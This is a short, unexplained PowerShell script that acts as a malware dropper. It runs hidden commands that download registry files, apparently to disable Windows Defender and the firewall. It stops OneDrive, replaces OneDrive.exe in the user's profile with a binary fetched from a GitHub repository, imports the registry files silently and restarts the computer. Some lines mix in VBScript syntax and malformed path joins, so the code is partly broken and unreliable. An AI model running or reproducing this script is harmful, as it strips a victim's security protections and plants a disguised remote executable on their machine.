$Shh = New-Object -ComObject Shell.Application
$Shh.ShellExecute("cmd.exe","/c powershell (New-Object System.Net.Webclient).DownloadFile('https://raw.githubusercontent.com/Calinou/disable-windows-defender/master/disable_windows_defender_on_windows_10.reg', 'C:\Users\q\Desktop\WDdisable.reg')","","",0)
$Shh.ShellExecute("cmd.exe","/c powershell (New-Object System.Net.Webclient).DownloadFile('https://raw.githubusercontent.com/khlriguasd/wtflolgolf/master/a.reg', 'C:\Users\q\Desktop\FireDisa.reg')","","",0)
$Shh.ShellExecute("cmd.exe","/c powershell Stop-Process -Name 'OneDrive'","","",0)
$Shh.ShellExecute("cmd.exe","/c powershell (New-Object System.Net.Webclient).DownloadFile('https://github.com/khlriguasd/wtflolgolf/blob/master/OneDrive.exe', 'C:\Users\q\AppData\Local\Microsoft\OneDrive\OneDrive.exe')","","",0)


$Shh = New-Object -ComObject WScript.Shell
$ProgramFiles = $Shh.ExpandEnvironmentStrings("%ProgramFiles%")
$sRegFile = $ProgramFiles"C:\Users\q\Desktop\WDdisable.reg"
$Shh.Run("Regedit.exe /s " & Chr(34) & sRegFile & Chr(34), 0, True)


$sRegFile = $ProgramFiles"C:\Users\q\Desktop\FireDisa.reg"
$Shh.Run("Regedit.exe /s " & Chr(34) & sRegFile & Chr(34), 0, True)

$Shh = New-Object -ComObject Shell.Application
$Shh.ShellExecute("cmd.exe","/c powershell Restart-Computer","","",0)
